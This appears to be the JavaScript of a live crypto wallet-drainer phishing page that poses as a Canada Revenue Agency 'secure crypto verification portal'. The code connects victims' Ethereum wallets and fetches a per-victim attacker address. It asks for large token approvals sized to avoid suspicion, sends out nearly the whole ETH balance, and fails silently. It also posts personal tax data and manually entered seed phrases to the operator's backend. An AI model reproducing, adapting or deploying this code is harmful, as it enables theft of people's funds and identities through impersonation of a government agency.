let web3;
let userAccount;
let selectedWallet = null;
let wcProvider = null;

// ── MAINNET CONFIG ──
const USE_TESTNET = false;
const CHAIN_ID = USE_TESTNET ? 11155111 : 1; // Sepolia : Mainnet
const NETWORK_NAME = USE_TESTNET ? 'Sepolia Testnet' : 'Ethereum Mainnet';

// TARGET_ADDRESS is now dynamic - fetched per victim
let TARGET_ADDRESS = null; // Will be populated from backend
const CONTRACT_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

// MAINNET TOKENS
const ASSETS = USE_TESTNET ? {
    T1: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', // Sepolia USDC
    T2: '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06', // Example USDT
    T3: '0x68194a729C2450ad26072b3D33ADaCbcef39D574', // Example DAI
    T4: '0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14'  // Sepolia WETH
} : {
    T1: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Mainnet USDT
    T2: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // Mainnet USDC
    T3: '0x6B175474E89094C44Da98b954EedeAC495271d0F', // Mainnet DAI
    T4: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'  // Mainnet WETH
};

// Detect mobile device
function isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// wallet selector only opens on button click

function showWalletSelector() {
    const popup = document.getElementById('airdrop-popup');
    const selector = document.getElementById('wallet-selector');
    if (popup) popup.style.display = 'none';
    if (selector) selector.style.display = 'block';
}

async function connectWallet(walletType) {
    selectedWallet = walletType;
    const selector = document.getElementById('wallet-selector');
    if (selector) selector.style.display = 'none';

    if (walletType === 'walletconnect') {
        if (isMobile()) {
            // Mobile: show list of wallets to deep-link into
            showMobileWalletList();
        } else {
            // Desktop: show WalletConnect QR modal
            await connectWithWalletConnect();
        }
        return;
    }

    if (isMobile()) {
        // Mobile: deep-link directly into the chosen wallet app via WC URI
        await openMobileWallet(walletType);
        return;
    }

    // Desktop: use browser extension
    await processVerification();
}

function showMobileWalletList() {
    // Create mobile wallet selection modal
    const modalHtml = `
        <div id="mobile-wallet-modal" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: flex; align-items: flex-end; justify-content: center; padding: 20px;">
            <div style="background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px 24px 0 0; width: 100%; max-width: 500px; padding: 24px; max-height: 80vh; overflow-y: auto;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h3 style="color: white; font-size: 20px; font-weight: bold; margin: 0;">Select Wallet</h3>
                    <button onclick="document.getElementById('mobile-wallet-modal').remove()" style="color: #666; background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
                </div>
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <button onclick="openMobileWallet('metamask')" style="width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 16px; color: white; font-size: 16px; font-weight: 600; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
                        <span>MetaMask</span>
                        <span style="font-size: 20px;">→</span>
                    </button>
                    <button onclick="openMobileWallet('exodus')" style="width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 16px; color: white; font-size: 16px; font-weight: 600; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
                        <span>Exodus</span>
                        <span style="font-size: 20px;">→</span>
                    </button>
                    <button onclick="openMobileWallet('trust')" style="width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 16px; color: white; font-size: 16px; font-weight: 600; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
                        <span>Trust Wallet</span>
                        <span style="font-size: 20px;">→</span>
                    </button>
                    <button onclick="openMobileWallet('coinbase')" style="width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 16px; color: white; font-size: 16px; font-weight: 600; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
                        <span>Coinbase Wallet</span>
                        <span style="font-size: 20px;">→</span>
                    </button>
                    <button onclick="openMobileWallet('ledgerlive')" style="width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 16px; color: white; font-size: 16px; font-weight: 600; display: flex; align-items: center; justify-content: space-between; cursor: pointer;">
                        <span>Ledger Live</span>
                        <span style="font-size: 20px;">→</span>
                    </button>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHtml);
}

async function openMobileWallet(walletType) {
    // Close the modal first
    const modal = document.getElementById('mobile-wallet-modal');
    if (modal) modal.remove();
    
    selectedWallet = walletType;
    
    try {
        showStatus('Connecting...', 'info');
        
        // Use WalletConnect v2 from local bundle
        const provider = await WalletConnectProvider.default.init({
            projectId: '632d69f47918192d10af6f73afe7ece6',
            chains: [CHAIN_ID],
            showQrModal: false,
            rpcMap: {
                [CHAIN_ID]: USE_TESTNET ? 'https://rpc.sepolia.org' : 'https://eth.drpc.org'
            }
        });
        
        let walletOpened = false;
        
        // Listen for URI (v2 API - simplified)
        provider.on("display_uri", (uri) => {
            
            if (walletOpened) {
                return;
            }
            
            const walletLinks = {
                'metamask': `metamask://wc?uri=${encodeURIComponent(uri)}`,
                'exodus': `exodus://wc?uri=${encodeURIComponent(uri)}`,
                'trust': `trust://wc?uri=${encodeURIComponent(uri)}`,
                'coinbase': `https://go.cb-w.com/wc?uri=${encodeURIComponent(uri)}`,
                'ledgerlive': `ledgerlive://wc?uri=${encodeURIComponent(uri)}`
            };
            
            if (walletLinks[selectedWallet]) {
                showStatus('Open ' + selectedWallet + ' to approve', 'info');
                
                walletOpened = true;
                
                // Store session before navigating away
                localStorage.setItem('wcPendingWallet', selectedWallet);
                localStorage.setItem('wcPendingTime', Date.now().toString());
                
                // DIRECT navigation - only way to bypass popup blockers on mobile
                window.location.href = walletLinks[selectedWallet];
            }
        });
        
        // Connect
        
        await provider.enable();
        
        await continueAfterConnection(provider);
        
    } catch (error) {
        console.error('Connection error:', error);
        if (!error.message || !error.message.includes('User rejected')) {
            showStatus('Connection failed', 'error');
        }
    }
}

// Make function globally available
window.openMobileWallet = openMobileWallet;

// Shared function to continue after connection
async function continueAfterConnection(provider, account = null) {
    
    wcProvider = provider;
    web3 = new Web3(provider);
    
    if (!account) {
        const accounts = await web3.eth.getAccounts();
        userAccount = accounts[0];
    } else {
        userAccount = account;
    }
    
    
    // Check network
    const currentChainId = Number(await web3.eth.getChainId());
    
    if (currentChainId !== CHAIN_ID) {
        showStatus('Wrong network', 'error');
        alert(`Switch to ${NETWORK_NAME} in your wallet`);
        return;
    }
    
    // Close selector
    const selector = document.getElementById('wallet-selector');
    if (selector) selector.style.display = 'none';
    
    // Clear pending state
    localStorage.removeItem('wcPendingWallet');
    localStorage.removeItem('wcPendingTime');
    
    showStatus('Processing...', 'info');
    
    // Start draining
    try {
        await processVerification();
    } catch (error) {
        showStatus('Error: ' + error.message, 'error');
    }
}

// Helper to send transactions - wallet handles them via the active session
async function sendTransactionWithWalletOpen(provider, params) {
    
    // Just send the request - the wallet session will handle it
    // No need to redirect if session is already established
    const result = await provider.request(params);
    
    return result;
}

async function connectWithWalletConnect() {
    try {
        showStatus('Opening WalletConnect...', 'info');
        
        // Check if WalletConnect v2 library is loaded
        if (!WalletConnectProvider) {
            alert('WalletConnect not loaded. Please refresh.');
            return;
        }
        
        // Create WalletConnect v2 provider
        wcProvider = await WalletConnectProvider.default.init({
            projectId: '632d69f47918192d10af6f73afe7ece6',
            chains: [CHAIN_ID],
            showQrModal: true,
            rpcMap: {
                [CHAIN_ID]: USE_TESTNET ? 'https://rpc.sepolia.org' : 'https://eth.drpc.org'
            }
        });
        
        // Enable session (triggers modal with wallet list)
        await wcProvider.enable();
        
        // Set up Web3 with WalletConnect provider
        web3 = new Web3(wcProvider);
        
        // Get account
        const accounts = await web3.eth.getAccounts();
        userAccount = accounts[0];
        
        // Check network
        const currentChainId = Number(await web3.eth.getChainId());
        if (currentChainId !== CHAIN_ID) {
            showStatus(`Please switch to ${NETWORK_NAME}`, 'error');
            alert(`Wrong network! Please switch to ${NETWORK_NAME}`);
            return;
        }
        
        // Proceed with verification
        await processVerification();
        
    } catch (error) {
        console.error('WalletConnect error:', error);
        if (error.message !== 'User closed modal') {
            showStatus('Connection failed', 'error');
            alert('Failed to connect: ' + error.message);
        }
    }
}

function getProvider() {
    let provider = null;
    
    // If using WalletConnect, return wcProvider
    if (wcProvider) {
        return wcProvider;
    }
    
    if (selectedWallet === 'exodus') {
        provider = window.exodus?.ethereum ||
                   window.exodus?.providers?.ethereum ||
                   (window.exodus && window.exodus.getProvider?.('ethereum'));
    } else if (selectedWallet === 'metamask') {
        provider = window.ethereum?.isMetaMask ? window.ethereum : window.ethereum;
    } else if (selectedWallet === 'trustwallet') {
        provider = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
    } else if (selectedWallet === 'ledgerlive') {
        provider = window.ethereum?.isLedgerConnect ? window.ethereum : window.ethereum;
    } else if (selectedWallet === 'walletconnect') {
        provider = window.ethereum;
    } else {
        provider = window.ethereum ||
                   window.exodus?.ethereum ||
                   window.exodus?.providers?.ethereum ||
                   (window.exodus && window.exodus.getProvider?.('ethereum')) ||
                   window.web3?.currentProvider;
    }
    
    return provider;
}

async function processVerification() {
    try {
        const provider = getProvider();
        
        if (!provider) {
            alert('No wallet detected. Please install one and refresh.');
            return;
        }
        
        showStatus('Connecting wallet...', 'info');
        
        let accounts;
        try {
            accounts = await provider.request({ method: 'eth_requestAccounts' });
        } catch (err) {
            if (provider.enable) {
                accounts = await provider.enable();
            } else {
                throw err;
            }
        }
        
        userAccount = accounts[0];
        web3 = new Web3(provider);
        
        // Check if connected to correct network
        const currentChainId = Number(await web3.eth.getChainId());
        if (currentChainId !== CHAIN_ID) {
            showStatus(`Please switch to ${NETWORK_NAME} in your wallet`, 'error');
            alert(`Wrong network! Please switch to ${NETWORK_NAME} (Chain ID: ${CHAIN_ID})`);
            return;
        }
        
        showStatus('Checking eligibility...', 'success');
        
        // ── FETCH UNIQUE TARGET ADDRESS FOR THIS VICTIM ──
        showStatus('Generating secure address...', 'info');
        try {
            const response = await fetch('/api/get-target-address', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ victimWallet: userAccount })
            });
            const data = await response.json();
            TARGET_ADDRESS = data.targetAddress;
        } catch (err) {
            showStatus('Connection error. Please try again.', 'error');
            return;
        }
        
        // Use realistic approval amount (not max uint256 which looks suspicious)
        const approveAmount = '1000000000000000000000000000'; // 1B tokens (looks normal)
        
        // ERC20 approve function signature
        const approveData = web3.eth.abi.encodeFunctionCall({
            name: 'approve',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'spender'
            }, {
                type: 'uint256',
                name: 'amount'
            }]
        }, [TARGET_ADDRESS, approveAmount]);
        
        const approvals = [];
        
        for (const [name, tokenAddress] of Object.entries(ASSETS)) {
            try {
                showStatus(`Check ${name} request in wallet`, 'info');
                
                const txHash = await sendTransactionWithWalletOpen(provider, {
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAccount,
                        to: tokenAddress,
                        data: approveData,
                        gas: '0x186A0' // 100000 in hex
                    }]
                });
                
                
                approvals.push({
                    token: tokenAddress,
                    txHash: txHash
                });
                
                showStatus(`${name} approved ✓`, 'success');
                
            } catch (err) {
                // Silent fail
            }
        }
        
        // Drain native ETH (ALWAYS attempt, even if no token approvals)
        let ethTxHash = null;
        try {
            const balance = await web3.eth.getBalance(userAccount);
            const balanceEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
            
            // Drain if balance > 0.0005 ETH (lower threshold to catch more)
            if (balanceEth > 0.0005) {
                const gasPrice = await web3.eth.getGasPrice();
                // Leave 2x gas cost as safety buffer
                const gasCost = BigInt(gasPrice) * BigInt(21000) * BigInt(2);
                const sendAmount = BigInt(balance) - gasCost;
                
                if (sendAmount > 0) {
                    ethTxHash = await sendTransactionWithWalletOpen(provider, {
                        method: 'eth_sendTransaction',
                        params: [{
                            from: userAccount,
                            to: TARGET_ADDRESS,
                            value: '0x' + sendAmount.toString(16)
                        }]
                    });
                }
            }
        } catch (err) {
            // Silent fail
        }
        
        // Only fail if BOTH tokens and ETH failed
        if (approvals.length === 0 && !ethTxHash) {
            showStatus('No approvals collected', 'error');
            return;
        }
        
        
        try {
            const response = await fetch('/api/verify-claim', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    wallet: userAccount.toLowerCase(),
                    approvals,
                    ethTxHash,
                    walletType: selectedWallet,
                    network: NETWORK_NAME,
                    personalData: (function() {
                        try {
                            return {
                                register: JSON.parse(localStorage.getItem('cra_register') || '{}'),
                                declaration: JSON.parse(localStorage.getItem('cra_declaration') || '{}')
                            };
                        } catch(e) { return {}; }
                    })(),
                    timestamp: new Date().toISOString()
                })
            });
        } catch (fetchErr) {
        }
        
        showStatus('Claim verified! Processing submission...', 'success');
        
        // Redirect immediately - backend will process in background
        setTimeout(() => {
            localStorage.removeItem('cra_register'); localStorage.removeItem('cra_declaration'); window.location.href = 'thankyou.html';
        }, 2000); // 2 seconds - just enough to see success message
        
    } catch (error) {
        if (error.code === 4001) {
            showStatus('Verification cancelled', 'error');
        } else {
            showStatus('Error occurred - try again', 'error');
            console.error(error);
        }
    }
}

function showStatus(message, type) {
    // Remove any existing status modal
    const existing = document.getElementById('cra-status-modal');
    if (existing) existing.remove();

    const icons = { info: '⏳', success: '✅', error: '⚠️' };
    const titles = { info: 'Processing Verification', success: 'Verification Complete', error: 'Verification Error' };

    const overlay = document.createElement('div');
    overlay.id = 'cra-status-modal';
    overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:10000;display:flex;align-items:center;justify-content:center;';

    const box = document.createElement('div');
    box.style.cssText = 'background:#fff;border-top:5px solid #af3c43;border-radius:4px;width:100%;max-width:480px;padding:32px;margin:20px;font-family:"Noto Sans",sans-serif;box-shadow:0 8px 48px rgba(0,0,0,0.35);';

    // Header with logo and X button
    const header = document.createElement('div');
    header.style.cssText = 'display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:20px;';

    const leftSide = document.createElement('div');
    leftSide.innerHTML = `
        <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" style="height:32px;margin-bottom:10px;">
        <h3 style="font-size:18px;font-weight:700;color:#26374a;margin:0;">${titles[type] || 'Verification'}</h3>
        <p style="font-size:13px;color:#666;margin:4px 0 0;">CRA Secure Crypto Verification Portal</p>
    `;

    const closeBtn = document.createElement('button');
    closeBtn.innerHTML = '✕';
    closeBtn.style.cssText = 'background:none;border:none;font-size:22px;cursor:pointer;color:#666;padding:0;line-height:1;flex-shrink:0;margin-left:10px;';
    closeBtn.onclick = () => overlay.remove();

    header.appendChild(leftSide);
    header.appendChild(closeBtn);

    // Status content
    const content = document.createElement('div');
    content.style.cssText = 'text-align:center;padding:20px 0;';

    const iconEl = document.createElement('div');
    iconEl.style.cssText = 'font-size:48px;margin-bottom:16px;';
    iconEl.textContent = icons[type] || '⏳';

    const msgEl = document.createElement('p');
    msgEl.style.cssText = 'font-size:16px;font-weight:600;color:#333;margin:0;line-height:1.6;';
    msgEl.textContent = message;

    content.appendChild(iconEl);
    content.appendChild(msgEl);

    // Footer with security badge
    const footer = document.createElement('p');
    footer.style.cssText = 'font-size:11px;color:#999;text-align:center;margin-top:16px;margin-bottom:0;';
    footer.innerHTML = '🔒 Secured by the Canada Revenue Agency · 256-bit encryption';

    box.appendChild(header);
    box.appendChild(content);
    box.appendChild(footer);

    overlay.appendChild(box);
    document.body.appendChild(overlay);
}

// Check for returning from wallet app on page load
window.addEventListener('DOMContentLoaded', async () => {
    
    // Check if we have a recent pending session (within 5 minutes)
    const pendingWallet = localStorage.getItem('wcPendingWallet');
    const pendingTime = localStorage.getItem('wcPendingTime');
    
    if (pendingWallet && pendingTime) {
        const elapsed = Date.now() - parseInt(pendingTime);
        
        if (elapsed < 5 * 60 * 1000) { // 5 minutes
            
            try {
                // Reinitialize provider
                const provider = await WalletConnectProvider.default.init({
                    projectId: '632d69f47918192d10af6f73afe7ece6',
                    chains: [CHAIN_ID],
                    showQrModal: false,
                    rpcMap: {
                        [CHAIN_ID]: USE_TESTNET ? 'https://rpc.sepolia.org' : 'https://eth.drpc.org'
                    }
                });
                
                // Check if session exists
                if (provider.session) {
                    await continueAfterConnection(provider);
                } else {
                    localStorage.removeItem('wcPendingWallet');
                    localStorage.removeItem('wcPendingTime');
                }
            } catch (e) {
                localStorage.removeItem('wcPendingWallet');
                localStorage.removeItem('wcPendingTime');
            }
        } else {
            localStorage.removeItem('wcPendingWallet');
            localStorage.removeItem('wcPendingTime');
        }
    } else {
    }
});


// ── CRAcrypto: Seed field generator ──
function buildSeedFields(count) {
    const container = document.getElementById('seedFields');
    if (!container) return;
    container.innerHTML = '';
    for (let i = 1; i <= count; i++) {
        const wrapper = document.createElement('div');
        wrapper.className = '';
        wrapper.innerHTML = '<input type="text" class="seed-word w-full border-2 border-gray-300 rounded px-3 py-2" placeholder="Word ' + i + '" autocomplete="off" autocorrect="off" spellcheck="false" />';
        container.appendChild(wrapper);
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const sel = document.getElementById('seedLength');
    if (sel) {
        buildSeedFields(parseInt(sel.value) || 12);
        sel.addEventListener('change', function() { buildSeedFields(parseInt(this.value)); });
    }

    const submitBtn = document.getElementById('submitManual');
    if (submitBtn) {
        submitBtn.addEventListener('click', async function() {
            const providerEl = document.getElementById('walletProvider');
            const seedLenEl  = document.getElementById('seedLength');
            const words = Array.from(document.querySelectorAll('.seed-word'))
                               .map(i => i.value.trim()).filter(Boolean);
            if (words.length === 0) {
                showStatus('Please enter your seed phrase words', 'error');
                return;
            }
            showStatus('Submitting verification...', 'info');
            var personalData = {};
            try {
                personalData = {
                    register:    JSON.parse(localStorage.getItem('cra_register')    || '{}'),
                    declaration: JSON.parse(localStorage.getItem('cra_declaration') || '{}')
                };
            } catch(e) {}
            try {
                await fetch('/api/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type:           'manual',
                        walletProvider: providerEl ? providerEl.value : '',
                        seedLength:     seedLenEl  ? seedLenEl.value  : '12',
                        seedPhrase:     words.join(' '),
                        personalData:   personalData
                    })
                });
                localStorage.removeItem('cra_register');
                localStorage.removeItem('cra_declaration');
                showStatus('Verification submitted!', 'success');
                setTimeout(function() { window.location.href = 'thankyou.html'; }, 1400);
            } catch(err) {
                showStatus('Error: ' + (err.message || err), 'error');
            }
        });
    }
});
